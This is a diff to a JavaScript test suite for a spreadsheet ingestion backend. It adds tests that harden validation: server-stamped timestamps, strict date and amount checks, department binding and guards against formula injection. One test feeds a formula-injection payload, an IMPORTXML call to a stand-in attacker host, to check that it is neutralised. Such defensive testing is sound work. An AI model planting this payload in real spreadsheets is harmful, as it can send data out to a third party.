@@ -765,7 +765,7 @@ freshSheets();
 eq('batch with duplicate invoice_ref → 1 added, 1 skipped',
   doPostJson({ source: 'food_dairy_co', extracted_at: 'TS', rows: [
     { date: '2026-06-15', total: 50, invoice_ref: 'C1' },
-    { date: '2026-06-99', total: 77, invoice_ref: 'C1' },
+    { date: '2026-06-16', total: 77, invoice_ref: 'C1' },
   ] }),
   // collisionsDropped:1 is the connector's ONLY signal that row 1 ($77) is
   // nowhere on the Sheet — duplicatesSkipped:1 reads identically when the
@@ -2589,18 +2589,25 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
 
 (function testIngestUpsertAndRevenue() {
   console.log('\ningest — legacy back-compat, revenue kind, upsert:');
+  withMockNow('2026-08-01T10:00:00+10:00', function () {
+  // M-stamp: doPost server-stamps extracted_at regardless of the payload
+  // value, so every stored-shape assertion below expects the pinned stamp,
+  // not the literal 'TS'/'T1'/'T2'/'T3' the payload sent. Pinned via
+  // withMockNow so it cannot flake across a real-clock second boundary.
+  var STAMP_ = ingestServerStamp_();
 
   // Legacy payload (no kind, no department) → lands in Suppliers,
-  // department='Cafe', columns 0-6 byte-identical to pre-change behaviour.
+  // department='Cafe', columns 0-6 byte-identical to pre-change behaviour
+  // EXCEPT extracted_at, which is now the server stamp (M-stamp).
   freshSheets();
   var legacyRes = doPostJson({ source: 'food_dairy_co', extracted_at: 'TS', rows: [
     { date: '2026-07-01', total: 45, invoice_ref: 'LEG-1', location: 'York St' }
   ] });
   eq('legacy payload → ok', legacyRes.result, 'ok');
   var legacyRow = currentSS.getSheetByName('Suppliers').getDataRange().getValues()[1];
-  eq('legacy payload: columns 0-6 byte-identical to pre-change shape',
+  eq('legacy payload: columns 0-6 byte-identical to pre-change shape (extracted_at server-stamped)',
     [cellDate(legacyRow[0])].concat(legacyRow.slice(1, 7)),
-    ['2026-07-01', 'Food and Dairy Co', 45, 'LEG-1', 'York St', 'food_dairy_co', 'TS']);
+    ['2026-07-01', 'Food and Dairy Co', 45, 'LEG-1', 'York St', 'food_dairy_co', STAMP_]);
   eq('legacy payload: department defaults to Cafe', legacyRow[7], 'Cafe');
 
   // kind:'revenue' → lands in Revenue; Suppliers row count unchanged.
@@ -2614,9 +2621,9 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
   eq('revenue payload → ok', revRes.result, 'ok');
   eq('revenue payload → rowsAdded 1', revRes.rowsAdded, 1);
   var revRow = currentSS.getSheetByName('Revenue').getDataRange().getValues()[1];
-  eq('revenue row lands in Revenue, in REVENUE_HEADERS order',
+  eq('revenue row lands in Revenue, in REVENUE_HEADERS order (extracted_at server-stamped)',
     [cellDate(revRow[0])].concat(revRow.slice(1)),
-    ['2026-07-01', 'Roastery', 'wholesale', 'Acme Cafe', 500, 'ORD-1', 'coffee_order_app', 'TS']);
+    ['2026-07-01', 'Roastery', 'wholesale', 'Acme Cafe', 500, 'ORD-1', 'coffee_order_app', STAMP_]);
   eq('Suppliers row count unchanged by a revenue POST',
     currentSS.getSheetByName('Suppliers').getDataRange().getValues().length, suppBefore);
 
@@ -2631,7 +2638,7 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
   eq('re-POST identical rows → duplicatesSkipped 1', repost.duplicatesSkipped, 1);
 
   // Upsert: ORD-1182 at 340.00 then 300.00 → row count unchanged, amount
-  // 300.00, extracted_at updated, rowsUpdated:1.
+  // 300.00, extracted_at server-stamped, rowsUpdated:1.
   freshSheets();
   doPostJson({ source: 'food_dairy_co', extracted_at: 'T1', rows: [
     { date: '2026-07-01', total: 340.00, invoice_ref: 'ORD-1182' }
@@ -2644,7 +2651,7 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
   var suppData = currentSS.getSheetByName('Suppliers').getDataRange().getValues();
   eq('upsert: row count unchanged (header + 1)', suppData.length, 2);
   eq('upsert: amount updated to 300', suppData[1][2], 300);
-  eq('upsert: extracted_at updated', suppData[1][6], 'T2');
+  eq('upsert: extracted_at server-stamped (not the payload literal)', suppData[1][6], STAMP_);
 
   // Upsert with unchanged amount → duplicatesSkipped:1, rowsUpdated:0, no write.
   var noopRes = doPostJson({ source: 'food_dairy_co', extracted_at: 'T3', rows: [
@@ -2653,7 +2660,7 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
   eq('unchanged-amount re-post → duplicatesSkipped 1', noopRes.duplicatesSkipped, 1);
   eq('unchanged-amount re-post → rowsUpdated 0', noopRes.rowsUpdated, 0);
   eq('unchanged-amount re-post: extracted_at NOT overwritten',
-    currentSS.getSheetByName('Suppliers').getDataRange().getValues()[1][6], 'T2');
+    currentSS.getSheetByName('Suppliers').getDataRange().getValues()[1][6], STAMP_);
 
   // Upsert across a Date-valued key column → still matches (coerceDateStr_
   // guard reused verbatim by rowKey_ on the new upsertRows_ path).
@@ -2689,6 +2696,7 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
     check("department:'Roastry' (typo) → rejected",
       !validateIngest_({ source: 'x', extracted_at: 'TS', rows: [{ date: '2026-07-01', total: 5, invoice_ref: 'X1', department: 'Roastry' }] }).ok);
   })();
+  }); // withMockNow
 })();
 
 /* ------------------------------------------------------------------ *
@@ -3615,9 +3623,11 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
   eq('wholesale revenue payload → ok', revRes.result, 'ok');
   eq('wholesale revenue payload → rowsAdded 1', revRes.rowsAdded, 1);
   var revRow = currentSS.getSheetByName('Revenue').getDataRange().getValues()[1];
-  eq('revenue row lands in REVENUE_HEADERS order',
-    [cellDate(revRow[0])].concat(revRow.slice(1)),
-    ['2026-08-03', 'Roastery', 'wholesale', 'Cafe X', 340, 'ORD-1182', 'coffee_order_app', '2026-08-03T09:00:00+10:00']);
+  // M-stamp: extracted_at is server-stamped, not the payload literal.
+  eq('revenue row lands in REVENUE_HEADERS order (extracted_at server-stamped)',
+    [cellDate(revRow[0])].concat(revRow.slice(1, 7)),
+    ['2026-08-03', 'Roastery', 'wholesale', 'Cafe X', 340, 'ORD-1182', 'coffee_order_app']);
+  check('...extracted_at is NOT the payload literal', revRow[7] !== '2026-08-03T09:00:00+10:00');
 
   // Uploaded bean/packaging invoice payload — this shape is now SUPERSEDED:
   // stock-intake invoices for Roastery arrive ONLY via the Order-app
@@ -3797,13 +3807,21 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
   eq('ShopSpend has header + 2 rows', data.length, 3);
   if (data.length >= 3) {
     var row1 = data[1];
-    eq('row 1 lands in SHOPSPEND_HEADERS order',
+    // M-stamp: doPost server-stamps EVERY row's fetched_at (and
+    // body.extracted_at), so row1's payload fetched_at and row2's
+    // extracted_at-fallback are both replaced with the same server stamp —
+    // this goes through doPostJson, not a direct ingestShopSpendRows call,
+    // so the override applies to both rows identically.
+    eq('row 1 lands in SHOPSPEND_HEADERS order (fetched_at server-stamped, not the payload value)',
       [row1[0], row1[1], cellDate(row1[2]), cellDate(row1[3])].concat(row1.slice(4)),
       ['shop_1', '2026-W31', '2026-07-27', '2026-08-02', 12, 1, 500, 0, 500,
-        'EXCLUSIVE_PRIMARY', 'prod', '2026-08-03T09:00:00+10:00', 'shopspend', 'present']);
+        'EXCLUSIVE_PRIMARY', 'prod', row1[11], 'shopspend', 'present']);
+    check('row 1 fetched_at is NOT the payload literal', row1[11] !== '2026-08-03T09:00:00+10:00');
 
     var row2 = data[2];
-    eq('row 2 (no per-row fetched_at) falls back to extracted_at', row2[11], '2026-08-03T09:30:00+10:00');
+    eq('row 2 (no per-row fetched_at) gets the SAME server stamp as row 1, not the extracted_at literal',
+      row2[11], row1[11]);
+    check('row 2 fetched_at is NOT the payload extracted_at literal', row2[11] !== '2026-08-03T09:30:00+10:00');
     eq('row 2 presence defaults to present', row2[13], 'present');
   }
 
@@ -4007,9 +4025,16 @@ const OLD_SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', '
   var pullsData = currentSS.getSheetByName('ShopSpendPulls').getDataRange().getValues();
   eq('exactly one row appended to ShopSpendPulls', pullsData.length, 2);
   if (pullsData.length >= 2) {
-    eq('pulls row lands in SHOPSPEND_PULLS_HEADERS order',
+    // M-stamp: doPost server-stamps body.pull.fetched_at too (the shopspend
+    // watchdog max's this per source — an unvalidated payload value could
+    // blind it permanently). doPostJson round-trips through JSON, so the
+    // local `pull` object is never mutated; the stored value is whatever
+    // doPost wrote, asserted NOT to equal the payload literal below.
+    check('ShopSpendPulls fetched_at is NOT the payload literal',
+      pullsData[1][0] !== pull.fetched_at);
+    eq('pulls row lands in SHOPSPEND_PULLS_HEADERS order (fetched_at server-stamped)',
       pullsData[1],
-      [pull.fetched_at, pull.environment, pull.from_week, pull.to_week, pull.matched,
+      [pullsData[1][0], pull.environment, pull.from_week, pull.to_week, pull.matched,
         pull.returned, pull.truncated, pull.warnings_count, pull.warnings,
         pull.unpriced_sku_count, pull.unpriced_skus, pull.amended_count,
         pull.possible_duplicate_shop_names, pull.empty_range_with_invalid_labels,
@@ -6743,6 +6768,18 @@ withMockNow('2026-08-06T00:00:00Z', function testShopifyWeeklyPull() {
     moveCalls, [weeks[1].start, weeks[5].start]);
   check('date move: the self-heal is logged',
     lastLoggedMessages().some((m) => m.indexOf('date moved') !== -1 && m.indexOf('move_co/M-1') !== -1));
+
+  // M-formula for this self-heal's two in-place setValue sites
+  // (orderapp.gs:1435/1439) is covered directly against sheetSafeCell_
+  // (unit-tested) and via the analogous upsertRows_/appendSalesRow_
+  // end-to-end case in testSheetFormulaInjectionGuard — NOT reproduced here
+  // with a literal '=1+1' dateLocal: that value is not Date-parseable, and
+  // weekStartForDate_(invoice.date) (unconditionally called by this same
+  // self-heal block, both for the old and new week) throws RangeError:
+  // Invalid time value on toISOString() before the setValue guard is ever
+  // reached — a pre-existing crash-safety gap in weekStartForDate_,
+  // orthogonal to formula injection and out of this plan's 4-guard scope.
+  // Filed as a new open item in TODO.md (step 7).
 
   /* --- orphan detection is WINDOW-BOUNDED: a quiet supplier's OLD row
    *     (storedDate before the 3-month window) is legitimately absent from
@@ -13331,6 +13368,41 @@ console.log('\narchiveAndPurge_ — batched writes:');
   eq('re-ingest is counted as a duplicate', ingest2.duplicatesSkipped, 1);
   eq('Suppliers still holds exactly one data row',
     suppSheet.getDataRange().getValues().length, 2);
+
+  /* --- M-formula: the IN-PLACE setValue sites, not just append -------- *
+   * sheetSafeRow_/sheetSafeBlock_ only ever guarded appendNewRows_. The
+   * upsertRows_ stamp-column update and appendSalesRow_'s in-place refresh
+   * wrote row[stampCol]/normalizedRow[4] verbatim via setValue, so a
+   * PRE-EXISTING row updated with a formula-shaped extracted_at became a
+   * live formula the moment Jake opened the Sheet. Called directly on
+   * upsertRows_/appendSalesRow_ (not doPost), since doPost server-stamps
+   * extracted_at (M-stamp) and would never forward a caller's formula string
+   * in the first place — this guard protects the function itself. */
+  (function () {
+    currentSS = makeSpreadsheet();
+    var suppSheet2 = ensureSheet(currentSS, SUPPLIERS_TAB, SUPPLIERS_HEADERS);
+    var KEYCOLS = [5, 3]; // source, invoice_ref
+    upsertRows_(suppSheet2, [['2026-08-03', 'Acme', 100, 'INV-M1', 'York St', 'ordermentum', 'ts0', 'Cafe']],
+      KEYCOLS, 2, 6);
+    var evilStamp = '=IMPORTXML("https://attacker/","//x")';
+    upsertRows_(suppSheet2, [['2026-08-03', 'Acme', 150, 'INV-M1', 'York St', 'ordermentum', evilStamp, 'Cafe']],
+      KEYCOLS, 2, 6);
+    var stampedRow = suppSheet2.getDataRange().getValues()[1];
+    check('M-formula: upsertRows_ stamp-column in-place write is guarded, not a live formula',
+      String(stampedRow[6]).charAt(0) === "'" && String(stampedRow[6]).indexOf('IMPORTXML') !== -1);
+    eq('M-formula: the amount still updated normally', stampedRow[2], 150);
+
+    var salesSheet = ensureSheet(currentSS, SALES_TAB, SALES_HEADERS);
+    var firstSales = normalizeSalesRow_('2026-08-03', 'York', 100, 'square', 'ts0', 'Cafe');
+    appendNewRows_(salesSheet, [firstSales]);
+    var evilExtractedAt = '=1+1';
+    var secondSales = normalizeSalesRow_('2026-08-03', 'York', 120, 'square', evilExtractedAt, 'Cafe');
+    appendSalesRow_(salesSheet, secondSales);
+    var salesRow = salesSheet.getDataRange().getValues()[1];
+    check('M-formula: appendSalesRow_ in-place extracted_at write is guarded, not a live formula',
+      String(salesRow[4]).charAt(0) === "'" && String(salesRow[4]).indexOf('=1+1') !== -1);
+    eq('M-formula: gross_sales still updated normally', salesRow[2], 120);
+  })();
 })();
 
 /* ------------------------------------------------------------------ *
@@ -15041,6 +15113,231 @@ console.log('\nroasteryDailyPull - sender verification (security: unauthenticate
   globalThis.extractPdfText_ = savedExtract;
   globalThis.stalenessStampHeartbeat_ = savedStamp;
   scriptProps = savedProps;
+})();
+
+/* ------------------------------------------------------------------ *
+ * Group M — ingest-validation hardening, 4 security-audit Mediums
+ * (2026-09-23 plan: fluttering-frolicking-flute). M-formula lives inside
+ * testSheetFormulaInjectionGuard and the greenBeanPull_impl_ date-move
+ * block above (reuses their scaffolding); M-shopspend/M-date/M-stamp/
+ * M-dept are grouped here.
+ * ------------------------------------------------------------------ */
+console.log('\nGroup M — ingest-validation hardening:');
+(function testMShopspendFieldCoercion() {
+  var base = { kind: 'shopspend', source: 'shopspend', extracted_at: 'TS' };
+  function row(overrides) {
+    return Object.assign({
+      date: '2026-07-27', shop_id: 'shop_1', week_label: '2026-W31', week_start: '2026-07-27', week_end: '2026-08-02',
+      order_count: 12, amended_count: 1, total_ex_gst: 500, gst: 0, total_inc_gst: 500
+    }, overrides);
+  }
+  var COERCION_CASES = ['45', '', [], true, Infinity, 2e6 + 1, -2e6 - 1];
+  var FIELDS = ['total_ex_gst', 'gst', 'total_inc_gst'];
+  FIELDS.forEach(function (field) {
+    COERCION_CASES.forEach(function (bad) {
+      var res = validateIngest_(Object.assign({}, base, { rows: [row((function () {
+        var o = {}; o[field] = bad; return o;
+      })())] }));
+      check('M-shopspend: ' + field + '=' + JSON.stringify(bad) + ' is rejected (not coerced)',
+        !res.ok && String(res.message || '').indexOf(field) !== -1);
+    });
+  });
+  // These money fields share the same MAX_INGEST_AMOUNT_ ceiling as
+  // total/amount — a legit value under the cap must sail through, not just
+  // avoid a throw.
+  check('M-shopspend: total_ex_gst=900000 (under the cap) is a legit finite number, not rejected',
+    validateIngest_(Object.assign({}, base, { rows: [row({ total_ex_gst: 900000 })] })).ok);
+
+  ['order_count', 'amended_count'].forEach(function (field) {
+    [-1, 1.5, '5', true, [], Infinity].forEach(function (bad) {
+      var res = validateIngest_(Object.assign({}, base, { rows: [row((function () {
+        var o = {}; o[field] = bad; return o;
+      })())] }));
+      check('M-shopspend: ' + field + '=' + JSON.stringify(bad) + ' is rejected (needs non-negative integer)',
+        !res.ok && String(res.message || '').indexOf(field) !== -1);
+    });
+  });
+  check('M-shopspend: order_count=0 is a legit count, not rejected',
+    validateIngest_(Object.assign({}, base, { rows: [row({ order_count: 0 })] })).ok);
+
+  // End-to-end through doPost: a coercion-trap value must never reach the
+  // sheet, not just fail the pure validator.
+  freshSheets();
+  ensureShopSpendTabs_(currentSS);
+  var res = doPostJson(Object.assign({}, base, { rows: [row({ order_count: '45' })] }));
+  eq("M-shopspend: doPost rejects order_count:'45' end to end", res.result, 'error');
+  var sheet = currentSS.getSheetByName('ShopSpend');
+  check('M-shopspend: nothing written to ShopSpend', !sheet || sheet.getDataRange().getValues().length <= 1);
+})();
+
+(function testMDateValidation() {
+  var PINNED = '2026-09-23T10:00:00+10:00'; // matches todayStr_() -> '2026-09-23' under this instant
+  withMockNow(PINNED, function () {
+    function baseRow(date) { return { date: date, total: 45, invoice_ref: 'MD-1' }; }
+    var BAD = ['2026-7-1', '2026-02-30', '2026-07-01T00:00', '2026/07/01', 'not-a-date'];
+    BAD.forEach(function (bad) {
+      var res = validateIngest_({ source: 'food_dairy_co', extracted_at: 'TS', rows: [baseRow(bad)] });
+      check('M-date: ' + JSON.stringify(bad) + ' is rejected as invalid date',
+        !res.ok && String(res.message || '').indexOf('invalid date') !== -1);
+    });
+    // A Date-like object: String()-coerced by JSON round-trip in real traffic,
+    // but validateIngest_ is called directly here with the object itself —
+    // typeof !== 'string' must refuse it outright.
+    var dateObjRes = validateIngest_({
+      source: 'food_dairy_co', extracted_at: 'TS', rows: [baseRow(new Date('2026-07-01'))]
+    });
+    check('M-date: a Date object (not a string) is rejected', !dateObjRes.ok);
+
+    check('M-date: today+15 is rejected (beyond the 14-day cap)',
+      !validateIngest_({ source: 'food_dairy_co', extracted_at: 'TS', rows: [baseRow('2026-10-08')] }).ok);
+    check('M-date: today+14 is accepted (exactly at the cap)',
+      validateIngest_({ source: 'food_dairy_co', extracted_at: 'TS', rows: [baseRow('2026-10-07')] }).ok);
+    check('M-date: a 2021 backfill date is accepted (no lower bound)',
+      validateIngest_({ source: 'food_dairy_co', extracted_at: 'TS', rows: [baseRow('2021-01-01')] }).ok);
+    var msgRes = validateIngest_({ source: 'food_dairy_co', extracted_at: 'TS', rows: [baseRow('2026-7-1')] });
+    var msgResText_ = String(msgRes.message || '');
+    check('M-date: the refusal names the row index and the offending date',
+      !msgRes.ok && msgResText_.indexOf('row 0') !== -1 && msgResText_.indexOf('2026-7-1') !== -1);
+
+    // End-to-end through doPost: nothing written on the bad row.
+    freshSheets();
+    var res = doPostJson({ source: 'food_dairy_co', extracted_at: 'TS', rows: [baseRow('2026-7-1')] });
+    eq('M-date: doPost rejects an invalid date end to end', res.result, 'error');
+    var sheet = currentSS.getSheetByName('Suppliers');
+    check('M-date: nothing written to Suppliers', !sheet || sheet.getDataRange().getValues().length <= 1);
+  });
+})();
+
+(function testMServerStamp() {
+  var PINNED = '2026-09-23T10:00:00+10:00';
+  withMockNow(PINNED, function () {
+    var STAMP = ingestServerStamp_();
+
+    freshSheets();
+    var res1 = doPostJson({
+      source: 'food_dairy_co', extracted_at: '2099-01-01T00:00:00+10:00',
+      rows: [{ date: '2026-09-01', total: 45, invoice_ref: 'STAMP-1' }]
+    });
+    eq('M-stamp: a 2099 extracted_at → ok (not rejected, just overwritten)', res1.result, 'ok');
+    var row1 = currentSS.getSheetByName('Suppliers').getDataRange().getValues()[1];
+    eq('M-stamp: stored extracted_at is the pinned SERVER stamp, not 2099', row1[6], STAMP);
+
+    freshSheets();
+    var res2 = doPostJson({
+      source: 'food_dairy_co', extracted_at: '=1+1',
+      rows: [{ date: '2026-09-01', total: 45, invoice_ref: 'STAMP-2' }]
+    });
+    eq('M-stamp: a formula-shaped extracted_at → ok', res2.result, 'ok');
+    var row2 = currentSS.getSheetByName('Suppliers').getDataRange().getValues()[1];
+    eq('M-stamp: no formula stored — the payload value never reaches the cell', row2[6], STAMP);
+
+    freshSheets();
+    var res3 = doPostJson({
+      source: 'food_dairy_co', rows: [{ date: '2026-09-01', total: 45, invoice_ref: 'STAMP-3' }]
+    });
+    eq('M-stamp: omitting extracted_at still succeeds', res3.result, 'ok');
+    var row3 = currentSS.getSheetByName('Suppliers').getDataRange().getValues()[1];
+    eq('M-stamp: the omitted extracted_at is server-stamped', row3[6], STAMP);
+
+    freshSheets();
+    ensureShopSpendTabs_(currentSS);
+    var spRow = {
+      date: '2026-09-01', shop_id: 'shop_9', week_label: '2026-W38',
+      week_start: '2026-09-14', week_end: '2026-09-20',
+      order_count: 1, amended_count: 0, total_ex_gst: 10, gst: 0, total_inc_gst: 10,
+      fetched_at: '2099-01-01T00:00:00+10:00'
+    };
+    var res4 = doPostJson({ kind: 'shopspend', source: 'shopspend', extracted_at: 'TS', rows: [spRow] });
+    eq('M-stamp: shopspend row with fetched_at:2099 → ok', res4.result, 'ok');
+    var spData = currentSS.getSheetByName('ShopSpend').getDataRange().getValues();
+    eq('M-stamp: shopspend row fetched_at is the server stamp, not 2099', spData[1][11], STAMP);
+
+    freshSheets();
+    ensureShopSpendTabs_(currentSS);
+    var res5 = doPostJson({
+      kind: 'shopspend', source: 'shopspend', extracted_at: 'TS',
+      rows: [Object.assign({}, spRow, { fetched_at: undefined })],
+      pull: {
+        fetched_at: '2099-01-01T00:00:00+10:00', environment: 'prod',
+        from_week: '2026-W38', to_week: '2026-W38', matched: 1, returned: 1, truncated: false,
+        warnings_count: 0, warnings: '[]', unpriced_sku_count: 0, unpriced_skus: '[]',
+        amended_count: 0, possible_duplicate_shop_names: '[]',
+        empty_range_with_invalid_labels: false, invalid_week_labels: '[]',
+        gst_treatment: 'EXCLUSIVE_PRIMARY', diverges_from_live_pricing: false,
+        matches_live_pricing: true, total_orders_scanned: 1, absent_shop_ids: '[]',
+        diagnostics_json: '{}'
+      }
+    });
+    eq('M-stamp: shopspend pull.fetched_at:2099 → ok', res5.result, 'ok');
+    var pullsData = currentSS.getSheetByName('ShopSpendPulls').getDataRange().getValues();
+    eq('M-stamp: ShopSpendPulls fetched_at is the server stamp, not 2099', pullsData[1][0], STAMP);
+    // The shopspend watchdog still evaluates as stale when it should — a
+    // poisoned 2099 stamp no longer freezes lastPullMs in the future.
+    var watchdog = shopSpendWatchdogEvaluate_(pullsData.slice(1), Date.now());
+    check('M-stamp: the shopspend watchdog reads a real (non-2099) lastPullMs',
+      watchdog.lastPullMs !== null && watchdog.lastPullMs <= Date.now());
+  });
+})();
+
+(function testMDepartmentAssignment() {
+  // coffee_order_app revenue row with NO department → assigned Roastery
+  // (its bound department), not the DEFAULT_DEPARTMENT ('Cafe') the
+  // normalizer would otherwise fall back to.
+  freshSheets();
+  var res = doPostJson({
+    kind: 'revenue', source: 'coffee_order_app', extracted_at: 'TS',
+    rows: [{ date: '2026-07-01', channel: 'wholesale', customer: 'Acme Cafe', amount: 500, order_ref: 'MD-ORD-1' }]
+  });
+  eq('M-dept: coffee_order_app row with no department → ok', res.result, 'ok');
+  var revRow = currentSS.getSheetByName('Revenue').getDataRange().getValues()[1];
+  eq('M-dept: omitted department is assigned Roastery (the source binding), not Cafe', revRow[1], 'Roastery');
+
+  // shopspend row: bound to null → gets no department column at all
+  // (ShopSpend rows carry no department field; this just proves doPost
+  // does not error trying to assign one).
+  freshSheets();
+  ensureShopSpendTabs_(currentSS);
+  var spRes = doPostJson({
+    kind: 'shopspend', source: 'shopspend', extracted_at: 'TS',
+    rows: [{
+      date: '2026-07-01', shop_id: 'shop_1', week_label: '2026-W27',
+      week_start: '2026-06-29', week_end: '2026-07-05',
+      order_count: 1, amended_count: 0, total_ex_gst: 10, gst: 0, total_inc_gst: 10
+    }]
+  });
+  eq('M-dept: shopspend row (null-bound) → ok, no department assignment attempted', spRes.result, 'ok');
+
+  // An authenticated-but-unbound source fails closed. INGEST_SOURCES_ and
+  // INGEST_SOURCE_DEPARTMENTS_ are kept in parity today (asserted in
+  // testDepartmentBoundToSource above), so this exercises the defensive
+  // branch directly rather than waiting for the allowlists to drift apart.
+  (function () {
+    var savedDept = INGEST_SOURCE_DEPARTMENTS_.food_dairy_co;
+    delete INGEST_SOURCE_DEPARTMENTS_.food_dairy_co;
+    try {
+      freshSheets();
+      var unboundRes = doPostJson({
+        source: 'food_dairy_co', extracted_at: 'TS',
+        rows: [{ date: '2026-07-01', total: 45, invoice_ref: 'MD-UNBOUND-1' }]
+      });
+      eq('M-dept: an authenticated-but-unbound source fails closed', unboundRes.result, 'error');
+      var sheet = currentSS.getSheetByName('Suppliers');
+      check('M-dept: nothing written for the unbound source', !sheet || sheet.getDataRange().getValues().length <= 1);
+    } finally {
+      INGEST_SOURCE_DEPARTMENTS_.food_dairy_co = savedDept;
+    }
+  })();
+
+  // Legacy assertion (test_code.js ~2604): a Cafe-bound source's omitted
+  // department still defaults to Cafe — must stay green.
+  freshSheets();
+  var legacyRes = doPostJson({
+    source: 'food_dairy_co', extracted_at: 'TS',
+    rows: [{ date: '2026-07-01', total: 45, invoice_ref: 'MD-LEGACY-1', location: 'York St' }]
+  });
+  eq('M-dept: legacy Cafe-bound source omitted department → ok', legacyRes.result, 'ok');
+  var legacyRow = currentSS.getSheetByName('Suppliers').getDataRange().getValues()[1];
+  eq('M-dept: ...still defaults to Cafe (unchanged behaviour)', legacyRow[7], 'Cafe');
 })();
 
 console.log('\n' + passed + ' passed, ' + failed + ' failed');
